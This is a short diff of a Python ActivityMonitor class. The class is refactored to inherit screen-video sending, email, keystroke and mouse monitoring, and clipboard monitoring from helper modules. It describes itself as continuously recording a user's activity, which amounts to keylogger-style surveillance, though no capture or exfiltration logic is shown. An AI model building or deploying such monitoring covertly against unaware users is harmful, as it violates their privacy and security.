@@ -1,14 +1,17 @@
-from threading import Thread
+
 import sys
 import io
 import time
 import socket
-from pathlib import Path
 import os
 import zipfile
+from helpers.videoClient import SendVideo as Video
+from helpers.emailClient import EmailClient as Email
+from helpers.keyMouseActivity import KeyMouseMonitor as KeyMouse
+from helpers.clipboardActivity import ClipboardMonitor as Clipboard
 
 
-class ActivityMonitor():
+class ActivityMonitor(Video, Email, KeyMouse, Clipboard):
     """
     A script that continously monitors the user's activity by capturing video 
     of the screen and logs all the processes of the user activities.
@@ -29,11 +32,8 @@ class ActivityMonitor():
 
     _LOG_INTERVAL = 10
 
-    def __init__(self, videoRecorder, activityLogger, emailClient):
+    def __init__(self, ):
 
-        self.videoRecoder = videoRecorder
-        self.activityLogger = activityLogger
-        self.emailClient = emailClient
         self.user = socket.gethostbyname(socket.gethostname())
 
         #: start the clipboard monitoring on a separate thread
